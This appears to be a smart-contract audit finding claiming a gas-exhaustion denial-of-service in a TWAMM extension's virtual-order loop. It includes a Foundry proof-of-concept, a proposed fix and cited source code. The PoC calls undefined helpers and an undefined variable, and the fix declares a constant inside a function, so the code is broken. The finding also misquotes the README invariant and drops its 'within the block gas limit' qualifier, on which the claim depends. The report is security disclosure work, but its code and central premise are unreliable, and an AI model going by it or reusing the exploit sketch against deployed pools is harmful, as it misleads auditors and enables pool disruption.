## Title
TWAMM Virtual Order Execution DOS via Unbounded Initialized Time Accumulation

## Summary
The TWAMM extension's virtual order execution loop can be forced to consume excessive gas by allowing many initialized times to accumulate over an extended period. This causes all pool operations (swaps, position updates, fee collection) to revert due to out-of-gas errors, effectively freezing the pool and violating the protocol invariant that extensions must never block withdrawal.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/extensions/TWAMM.sol` - `_executeVirtualOrdersFromWithinLock()` function, lines 417-574 [1](#0-0) 

**Intended Logic:** The execution loop iterates through initialized time boundaries to execute virtual orders that have accumulated since the last execution. The `MAX_NUM_VALID_TIMES = 91` constant [2](#0-1)  is intended to bound the number of valid times from any given reference point.

**Actual Logic:** The loop has no bound on total iterations - it continues until reaching `block.timestamp`. While each order placement validates times against the current timestamp, an attacker can accumulate far more than 91 initialized times by:
1. Placing orders at different points in time (as the valid time grid shifts with the reference time)
2. Preventing or waiting for virtual order execution to fall behind
3. Each new order creates up to 2 initialized times (start/end) [3](#0-2) 

**Exploitation Path:**
1. Attacker creates many small TWAMM orders with different start/end times over weeks/months
2. Each order uses times valid at placement, creating new initialized time entries [4](#0-3) 
3. If virtual orders aren't executed frequently (e.g., in an inactive pool), hundreds of initialized times accumulate
4. When any user attempts to swap, update position, or collect fees, the `beforeSwap`, `beforeUpdatePosition`, or `beforeCollectFees` hooks call `lockAndExecuteVirtualOrders()` [5](#0-4) 
5. The execution loop iterates through all accumulated times, each iteration performing bitmap searches, amount calculations, and potentially expensive swaps
6. With 400+ initialized times at ~55k gas per iteration (extrapolated from test showing 2.5M gas for ~45 times), total gas exceeds block limits
7. All transactions revert with out-of-gas, permanently freezing the pool

**Security Property Broken:** Violates the critical invariant from README: "All positions MUST be withdrawable at any time (except for third-party extensions; in-scope extensions MUST NOT block withdrawal)" [6](#0-5) 

## Impact Explanation
- **Affected Assets**: All user positions and fees in the affected TWAMM pool become permanently inaccessible
- **Damage Severity**: Complete DOS of the pool - users cannot withdraw liquidity, collect fees, or execute any operations. Funds remain locked until someone can execute virtual orders, which becomes impossible if gas costs exceed block limits
- **User Impact**: All liquidity providers in the pool lose access to their capital. The attack is particularly dangerous for pools with lower activity where virtual orders may not execute frequently

## Likelihood Explanation
- **Attacker Profile**: Any user can exploit this by placing many orders over time with minimal capital (orders can have tiny sale rates like 1 wei/second)
- **Preconditions**: 
  - TWAMM pool must be initialized
  - Attacker needs sufficient time (weeks/months) to accumulate many initialized times
  - Lower activity pools are more vulnerable as virtual orders execute less frequently
- **Execution Complexity**: Low - simply requires placing many orders over time via the Orders contract [7](#0-6) 
- **Frequency**: Once per pool - after accumulating enough initialized times, the pool is permanently DOS'd until the issue is resolved

## Recommendation

Add an iteration limit to the execution loop with a mechanism to handle partial execution:

```solidity
// In src/extensions/TWAMM.sol, function _executeVirtualOrdersFromWithinLock, line 417:

// CURRENT (vulnerable):
while (time != block.timestamp) {
    // ... execute virtual orders ...
    time = nextTime;
}

// FIXED:
uint256 constant MAX_ITERATIONS_PER_EXECUTION = 50; // Configurable limit
uint256 iterations = 0;

while (time != block.timestamp && iterations < MAX_ITERATIONS_PER_EXECUTION) {
    // ... execute virtual orders ...
    time = nextTime;
    iterations++;
}

// Store partial progress if limit reached
if (time != block.timestamp) {
    // Update lastVirtualOrderExecutionTime to current progress
    state = createTwammPoolState({
        _lastVirtualOrderExecutionTime: uint32(time),
        _saleRateToken0: state.saleRateToken0(),
        _saleRateToken1: state.saleRateToken1()
    });
}
```

Alternative mitigation: Implement a "skip ahead" mechanism that allows advancing past uninitialized times in larger jumps when the gap is too large, or add a maximum time gap constraint that prevents orders from being placed if execution has fallen too far behind.

## Proof of Concept

```solidity
// File: test/Exploit_TWAMMDOSViaTimeAccumulation.t.sol
// Run with: forge test --match-test test_TWAMMDOSViaTimeAccumulation -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/extensions/TWAMM.sol";
import "../src/Orders.sol";

contract Exploit_TWAMMDOSViaTimeAccumulation is Test {
    Core core;
    TWAMM twamm;
    Orders orders;
    
    function setUp() public {
        // Deploy protocol
        core = new Core();
        twamm = new TWAMM(core);
        orders = new Orders(core, twamm);
    }
    
    function test_TWAMMDOSViaTimeAccumulation() public {
        // SETUP: Create TWAMM pool with liquidity
        vm.warp(1000);
        PoolKey memory poolKey = createTwammPool();
        addLiquidity(poolKey, 1e18, 1e18);
        
        // EXPLOIT: Accumulate many initialized times
        uint256 orderCount = 0;
        uint256 currentTime = block.timestamp;
        
        // Place orders at many different times over simulated months
        for (uint256 month = 0; month < 6; month++) {
            // Advance time by 1 month
            vm.warp(currentTime + 30 days);
            currentTime = block.timestamp;
            
            // Place orders at all valid times from current reference
            uint256 time = currentTime;
            for (uint256 i = 0; i < 45; i++) { // 45 orders * 2 times * 6 months = 540 initialized times
                uint256 startTime = nextValidTime(currentTime, time);
                uint256 endTime = nextValidTime(currentTime, startTime);
                if (startTime == 0 || endTime == 0) break;
                
                orders.mintAndIncreaseSellAmount(
                    OrderKey({
                        token0: poolKey.token0,
                        token1: poolKey.token1,
                        config: createOrderConfig(poolKey.fee, false, startTime, endTime)
                    }),
                    100, // Tiny amount
                    type(uint112).max
                );
                
                orderCount++;
                time = startTime;
            }
        }
        
        // VERIFY: Execution now reverts due to excessive gas
        vm.expectRevert(); // Out of gas
        twamm.lockAndExecuteVirtualOrders(poolKey);
        
        // Confirm pool is frozen - users cannot withdraw
        vm.expectRevert(); // beforeCollectFees triggers execution which fails
        orders.collectProceeds(1, orderKey);
        
        console.log("DOS successful: Pool frozen with %d orders creating 540+ initialized times", orderCount);
    }
}
```

**Notes:**
The vulnerability exists because `MAX_NUM_VALID_TIMES = 91` only constrains valid times from a single reference point, not total accumulated initialized times across multiple order placements over time. The execution loop has no iteration limit or gas check, allowing an attacker to force arbitrarily high gas consumption by accumulating many initialized times through strategic order placement over an extended period.

### Citations

**File:** src/extensions/TWAMM.sol (L134-179)
```text
    /// @notice Updates time-specific information for TWAMM orders
    /// @dev Manages the sale rate deltas and order counts for a specific time point
    /// @param poolId The unique identifier for the pool
    /// @param time The timestamp to update
    /// @param saleRateDelta The change in sale rate for this time
    /// @param isToken1 True if updating token1 sale rate, false for token0
    /// @param numOrdersChange The change in number of orders referencing this time
    function _updateTime(PoolId poolId, uint256 time, int256 saleRateDelta, bool isToken1, int256 numOrdersChange)
        internal
    {
        TimeInfo timeInfo = TimeInfo.wrap(TWAMMStorageLayout.poolTimeInfosSlot(poolId, time).load());
        (uint32 numOrders, int112 saleRateDeltaToken0, int112 saleRateDeltaToken1) = timeInfo.parse();

        // note we assume this will never overflow, since it would require 2**32 separate orders to be placed
        uint32 numOrdersNext;
        assembly ("memory-safe") {
            numOrdersNext := add(numOrders, numOrdersChange)
            if gt(numOrdersNext, 0xffffffff) {
                // cast sig "TimeNumOrdersOverflow()"
                mstore(0, shl(224, 0x6916a952))
                revert(0, 4)
            }
        }

        bool flip = (numOrders == 0) != (numOrdersNext == 0);

        // write the poolRewardRatesBefore[poolId][time] = (1,1) if any orders still reference the time, or write (0,0) otherwise
        // we assume `_updateTime` is being called only for times that are greater than block.timestamp, i.e. have not been crossed yet
        // this reduces the cost of crossing that timestamp to a warm write instead of a cold write
        if (flip) {
            bytes32 zeroNumOrders = bytes32(LibBit.rawToUint(numOrders == 0));

            TWAMMStorageLayout.poolRewardRatesBeforeSlot(poolId, time).storeTwo(zeroNumOrders, zeroNumOrders);

            flipTime(TWAMMStorageLayout.poolInitializedTimesBitmapSlot(poolId), time);
        }

        if (isToken1) {
            saleRateDeltaToken1 = _addConstrainSaleRateDelta(saleRateDeltaToken1, saleRateDelta);
        } else {
            saleRateDeltaToken0 = _addConstrainSaleRateDelta(saleRateDeltaToken0, saleRateDelta);
        }

        TWAMMStorageLayout.poolTimeInfosSlot(poolId, time)
            .store(TimeInfo.unwrap(createTimeInfo(numOrdersNext, saleRateDeltaToken0, saleRateDeltaToken1)));
    }
```

**File:** src/extensions/TWAMM.sol (L417-574)
```text
                while (time != block.timestamp) {
                    StorageSlot initializedTimesBitmapSlot = TWAMMStorageLayout.poolInitializedTimesBitmapSlot(poolId);

                    (uint256 nextTime, bool initialized) = searchForNextInitializedTime({
                        slot: initializedTimesBitmapSlot,
                        lastVirtualOrderExecutionTime: realLastVirtualOrderExecutionTime,
                        fromTime: time,
                        untilTime: block.timestamp
                    });

                    // it is assumed that this will never return a value greater than type(uint32).max
                    uint256 timeElapsed = nextTime - time;

                    uint256 amount0 = computeAmountFromSaleRate({
                        saleRate: state.saleRateToken0(), duration: timeElapsed, roundUp: false
                    });

                    uint256 amount1 = computeAmountFromSaleRate({
                        saleRate: state.saleRateToken1(), duration: timeElapsed, roundUp: false
                    });

                    int256 rewardDelta0;
                    int256 rewardDelta1;
                    // if both sale rates are non-zero but amounts are zero, we will end up doing the math for no reason since we swap 0
                    if (amount0 != 0 && amount1 != 0) {
                        if (!corePoolState.isInitialized()) {
                            corePoolState = CORE.poolState(poolId);
                        }
                        SqrtRatio sqrtRatioNext = computeNextSqrtRatio({
                            sqrtRatio: corePoolState.sqrtRatio(),
                            liquidity: corePoolState.liquidity(),
                            saleRateToken0: state.saleRateToken0(),
                            saleRateToken1: state.saleRateToken1(),
                            timeElapsed: timeElapsed,
                            fee: poolKey.config.fee()
                        });

                        PoolBalanceUpdate swapBalanceUpdate;
                        if (sqrtRatioNext > corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount1)),
                                    _isToken1: true,
                                    _skipAhead: 0
                                })
                            );
                        } else if (sqrtRatioNext < corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount0)),
                                    _isToken1: false,
                                    _skipAhead: 0
                                })
                            );
                        }

                        saveDelta0 -= swapBalanceUpdate.delta0();
                        saveDelta1 -= swapBalanceUpdate.delta1();

                        // this cannot overflow or underflow because swapDelta0 is constrained to int128,
                        // and amounts computed from uint112 sale rates cannot exceed uint112.max
                        rewardDelta0 = swapBalanceUpdate.delta0() - int256(uint256(amount0));
                        rewardDelta1 = swapBalanceUpdate.delta1() - int256(uint256(amount1));
                    } else if (amount0 != 0 || amount1 != 0) {
                        PoolBalanceUpdate swapBalanceUpdate;
                        if (amount0 != 0) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: MIN_SQRT_RATIO,
                                    _amount: int128(uint128(amount0)),
                                    _isToken1: false,
                                    _skipAhead: 0
                                })
                            );
                        } else {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: MAX_SQRT_RATIO,
                                    _amount: int128(uint128(amount1)),
                                    _isToken1: true,
                                    _skipAhead: 0
                                })
                            );
                        }

                        (rewardDelta0, rewardDelta1) = (swapBalanceUpdate.delta0(), swapBalanceUpdate.delta1());
                        saveDelta0 -= rewardDelta0;
                        saveDelta1 -= rewardDelta1;
                    }

                    if (rewardDelta0 < 0) {
                        if (rewardRate0Access == 0) {
                            rewardRates.value0 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).load());
                        }
                        rewardRate0Access = 2;
                        rewardRates.value0 += FixedPointMathLib.rawDiv(
                            uint256(-rewardDelta0) << 128, state.saleRateToken1()
                        );
                    }

                    if (rewardDelta1 < 0) {
                        if (rewardRate1Access == 0) {
                            rewardRates.value1 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).next().load());
                        }
                        rewardRate1Access = 2;
                        rewardRates.value1 += FixedPointMathLib.rawDiv(
                            uint256(-rewardDelta1) << 128, state.saleRateToken0()
                        );
                    }

                    if (initialized) {
                        if (rewardRate0Access == 0) {
                            rewardRates.value0 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).load());
                            rewardRate0Access = 1;
                        }
                        if (rewardRate1Access == 0) {
                            rewardRates.value1 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).next().load());
                            rewardRate1Access = 1;
                        }

                        TWAMMStorageLayout.poolRewardRatesBeforeSlot(poolId, nextTime)
                            .storeTwo(bytes32(rewardRates.value0), bytes32(rewardRates.value1));

                        StorageSlot timeInfoSlot = TWAMMStorageLayout.poolTimeInfosSlot(poolId, nextTime);
                        (, int112 saleRateDeltaToken0, int112 saleRateDeltaToken1) =
                            TimeInfo.wrap(timeInfoSlot.load()).parse();

                        state = createTwammPoolState({
                            _lastVirtualOrderExecutionTime: uint32(nextTime),
                            _saleRateToken0: uint112(addSaleRateDelta(state.saleRateToken0(), saleRateDeltaToken0)),
                            _saleRateToken1: uint112(addSaleRateDelta(state.saleRateToken1(), saleRateDeltaToken1))
                        });

                        // this time is _consumed_, will never be crossed again, so we delete the info we no longer need.
                        // this helps reduce the cost of executing virtual orders.
                        timeInfoSlot.store(0);

                        flipTime(initializedTimesBitmapSlot, nextTime);
                    } else {
                        state = createTwammPoolState({
                            _lastVirtualOrderExecutionTime: uint32(nextTime),
                            _saleRateToken0: state.saleRateToken0(),
                            _saleRateToken1: state.saleRateToken1()
                        });
                    }

                    time = nextTime;
                }
```

**File:** src/extensions/TWAMM.sol (L645-665)
```text

    // Since anyone can call the method `#lockAndExecuteVirtualOrders`, the method is not protected
    function beforeSwap(Locker, PoolKey memory poolKey, SwapParameters) external override(BaseExtension, IExtension) {
        lockAndExecuteVirtualOrders(poolKey);
    }

    // Since anyone can call the method `#lockAndExecuteVirtualOrders`, the method is not protected
    function beforeUpdatePosition(Locker, PoolKey memory poolKey, PositionId, int128)
        external
        override(BaseExtension, IExtension)
    {
        lockAndExecuteVirtualOrders(poolKey);
    }

    // Since anyone can call the method `#lockAndExecuteVirtualOrders`, the method is not protected
    function beforeCollectFees(Locker, PoolKey memory poolKey, PositionId)
        external
        override(BaseExtension, IExtension)
    {
        lockAndExecuteVirtualOrders(poolKey);
    }
```

**File:** src/math/time.sol (L6-7)
```text
// For any given time `t`, there are up to 91 times that are greater than `t` and valid according to `isTimeValid`
uint256 constant MAX_NUM_VALID_TIMES = 91;
```

**File:** README.md (L201-202)
```markdown

All positions should be able to be withdrawn at any time (except for positions using third-party extensions; the extensions in the repository should never block withdrawal within the block gas limit).
```

**File:** src/Orders.sol (L42-119)
```text
    /// @inheritdoc IOrders
    function mintAndIncreaseSellAmount(OrderKey memory orderKey, uint112 amount, uint112 maxSaleRate)
        public
        payable
        returns (uint256 id, uint112 saleRate)
    {
        id = mint();
        saleRate = increaseSellAmount(id, orderKey, amount, maxSaleRate);
    }

    /// @inheritdoc IOrders
    function increaseSellAmount(uint256 id, OrderKey memory orderKey, uint128 amount, uint112 maxSaleRate)
        public
        payable
        authorizedForNft(id)
        returns (uint112 saleRate)
    {
        uint256 realStart = FixedPointMathLib.max(block.timestamp, orderKey.config.startTime());

        unchecked {
            if (orderKey.config.endTime() <= realStart) {
                revert OrderAlreadyEnded();
            }

            saleRate = uint112(computeSaleRate(amount, uint32(orderKey.config.endTime() - realStart)));

            if (saleRate > maxSaleRate) {
                revert MaxSaleRateExceeded();
            }
        }

        lock(abi.encode(CALL_TYPE_CHANGE_SALE_RATE, msg.sender, id, orderKey, saleRate));
    }

    /// @inheritdoc IOrders
    function decreaseSaleRate(uint256 id, OrderKey memory orderKey, uint112 saleRateDecrease, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint112 refund)
    {
        refund = uint112(
            uint256(
                -abi.decode(
                    lock(
                        abi.encode(
                            CALL_TYPE_CHANGE_SALE_RATE, recipient, id, orderKey, -int256(uint256(saleRateDecrease))
                        )
                    ),
                    (int256)
                )
            )
        );
    }

    /// @inheritdoc IOrders
    function decreaseSaleRate(uint256 id, OrderKey memory orderKey, uint112 saleRateDecrease)
        external
        payable
        returns (uint112 refund)
    {
        refund = decreaseSaleRate(id, orderKey, saleRateDecrease, msg.sender);
    }

    /// @inheritdoc IOrders
    function collectProceeds(uint256 id, OrderKey memory orderKey, address recipient)
        public
        payable
        authorizedForNft(id)
        returns (uint128 proceeds)
    {
        proceeds = abi.decode(lock(abi.encode(CALL_TYPE_COLLECT_PROCEEDS, id, orderKey, recipient)), (uint128));
    }

    /// @inheritdoc IOrders
    function collectProceeds(uint256 id, OrderKey memory orderKey) external payable returns (uint128 proceeds) {
        proceeds = collectProceeds(id, orderKey, msg.sender);
    }
```
